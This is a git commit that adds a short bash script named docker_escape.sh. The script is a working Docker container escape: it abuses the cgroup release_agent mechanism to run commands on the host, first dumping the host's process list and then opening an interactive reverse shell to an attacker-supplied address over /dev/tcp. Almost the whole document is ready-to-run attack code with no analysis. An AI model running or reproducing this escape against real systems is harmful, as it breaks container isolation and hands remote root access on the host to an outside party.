378574ba8bd3839b3444e3119826bde64b5cc963
Nassim Benmalek <64651792+xenity@users.noreply.github.com>
2022-05-19 17:59:01 +0200

    Create docker_escape.sh

---
+++ docker_escape.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "ps aux > $host_path/output" >> /cmd
+chmod a+x /cmd
+echo '#!/bin/bash' > /cmd
+echo "bash -i >& /dev/tcp/$1/$2 0>&1" >> /cmd
+chmod a+x /cmd 
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
